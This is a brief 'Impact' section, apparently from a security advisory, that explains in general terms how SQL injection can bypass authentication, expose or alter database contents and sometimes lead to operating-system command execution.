## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
